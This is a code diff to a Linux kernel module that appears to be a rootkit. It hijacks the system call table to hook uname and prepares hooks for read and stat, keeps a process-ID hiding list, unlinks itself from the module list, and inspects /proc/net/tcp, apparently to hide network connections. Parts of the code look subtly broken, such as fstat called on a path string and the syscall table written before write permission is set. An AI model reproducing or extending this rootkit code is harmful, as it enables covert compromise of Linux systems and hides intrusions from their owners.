@@ -18,6 +18,7 @@
 
 #include <linux/module.h>
 #include <linux/kernel.h>
+#include <linux/types.h>
 #include <linux/init.h>
 #include <linux/string.h>
 #include <linux/stat.h>
@@ -34,6 +35,11 @@
 #include <linux/unistd.h>
 #include <asm/syscall.h>
 #include <linux/utsname.h>
+#include <linux/namei.h>
+#include <asm/uaccess.h>
+#include <linux/kdev_t.h>
+#include <linux/stat.h>
+#include <asm/stat.h>
 
 MODULE_LICENSE("GPL");
 
@@ -44,7 +50,10 @@ static char pid_list[10][32];
 static int last_proc = -1;
 static unsigned long **_sys_call_table = NULL;
 static int failed = 0;
+
 static asmlinkage long (*org_uname) (struct new_utsname *);
+static asmlinkage long (*org_read) (int, void*, size_t);
+static asmlinkage long (*org_stat) (const char __user *filename, struct __old_kernel_stat __user *statbuf);
 
 asmlinkage long uname(struct new_utsname *name) {
   org_uname(name);
@@ -74,7 +83,14 @@ static void find_sctable(void) {
 static inline void memorize(void) {
   prev_entry = THIS_MODULE->list.prev;
   find_sctable();
+
+  struct __old_kernel_stat buf;
+  char dev[50];
+  sys_fstat("/proc/net/tcp", &buf);
+  print_dev_t(dev, buf.st_dev);
+
   org_uname = _sys_call_table[__NR_uname];
+  org_read = _sys_call_table[__NR_read];
 }
 
 static inline void vanish(void) {
@@ -138,7 +154,8 @@ static int __init load_module(void) {
 static void __exit cleanup(void) {
   if (failed)
     return;
-  
+
+  _sys_call_table[__NR_uname] = org_uname;
   set_write_permission();
   return;
 }
